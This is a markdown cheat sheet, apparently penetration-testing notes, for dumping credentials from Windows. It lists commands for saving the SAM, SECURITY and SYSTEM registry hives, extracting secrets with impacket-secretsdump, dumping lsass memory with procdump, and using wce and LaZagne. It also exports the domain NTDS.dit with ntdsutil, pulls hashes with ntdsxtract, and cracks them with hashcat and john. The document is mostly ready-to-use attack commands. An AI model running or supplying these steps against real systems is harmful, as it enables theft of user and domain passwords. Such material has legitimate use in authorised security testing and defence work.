# Clear Text Credentials Dump on windows 

# Local Password dump

## Impacket

https://github.com/CoreSecurity/impacket

- get LSA secret keys from reg

```
reg save hklm\sam c:\temp\sam.save
reg save hklm\security c:\temp\security.save
reg save hklm\system c:\temp\system.save
```

- dump with impacket

```
impacket-secretsdump -sam /root/sam.save -security /root/security.save -system /root/Desktop/system.save Local
```

## Metasploit module

- post/windows/gather/lsa_secrets

## LSAsecrte binary

https://github.com/linuxmuster/lsaSecrets/blob/master/bin/lsaSecretRead.exe

``` lsaSecretRead.exe DefaultPassword ```

## LSASS process with processdump

```
procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
```

## WCE

- https://www.ampliasecurity.com/research/windows-credentials-editor/


```
wce.exe -w
```

## Credential manager

- https://github.com/AlessandroZ/LaZagne
```
lazagne all 
```

## Nishan framework

- https://github.com/samratashok/nishang

## Group Policy Preference 

- metasploit module

``` post/windows/gather/credentials/gpp ```

# Domain Password dump

- Export NTDS with ntdsutil

```
ntdsutil “ac i ntds” “ifm” “create full c:\temp” q q
```

- install esdbexport
  - https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz
```
sudo apt-get install autoconf automake autopoint libtool pkg-config
```
- Dump Tables
```
/usr/local/bin/esedbexport -m tables ntds.dit
```

- install ntdsextract

  - https://github.com/csababarta/ntdsxtract
  - need datatable, link_table, system hive

```
dsusers.py <datatable> <link_table> <output_dir> --syshive <systemhive> --passwordhashes <format options>
```
format options is john, ocl ,ophc

- crack with hashcat , john 

```
hashcat -m 1000 output/ntout --username /path/to/wordlist

john –rules=all –fork=2 NT.out
```

## Reference 
- https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
- https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/
